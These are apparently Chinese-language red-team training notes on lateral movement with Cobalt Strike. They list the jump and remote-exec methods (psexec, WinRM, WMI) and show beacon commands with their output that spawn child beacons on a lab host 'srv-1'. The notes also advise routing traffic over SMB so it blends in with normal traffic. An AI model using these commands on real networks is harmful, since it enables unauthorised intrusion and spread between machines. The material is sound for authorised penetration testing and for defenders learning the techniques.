# Lateral Movement

在Cobalt Strike里，提供了三种方法进行横向移动

## ```jump```命令

用法：```jump [method] [target] [listener]```

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

## ```remote-exec```命令

用法：```remote-exec [method] [target] [command]```

```
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```


## ```powershell```和```execute-assembly```等Cobalt Strike内置的命令


通过列举C盘目录验证是否横向成功
```
ls \\srv-1\c$
```


# PowerShell Remoting

查询靶机架构
```
beacon> remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
64-bit
```

```winrm```32位横向使用


```winrm64```64位横向使用



推荐使用 SMB 协议横向。SMB 协议在 Windows 环境中广泛使用，因此横向的时候可以和smb本身的流量融合在一起。
```
beacon> jump winrm64 srv-1 smb
[+] established link to child beacon: 10.10.17.25
```


WinRM返回的是一个高完整性的beacon，可以和远程计算机建立交互式的shell


# PsExec

psexec和psexec64是唯一执行```jump```命令后可以自动执行进程迁移的方法（默认为rundll32.exe），这样做是为了自动从磁盘中删除上传的服务二进制文件。

```
beacon> jump psexec64 srv-1 smb
Started service dd80980 on srv-1
[+] established link to child beacon: 10.10.17.25
```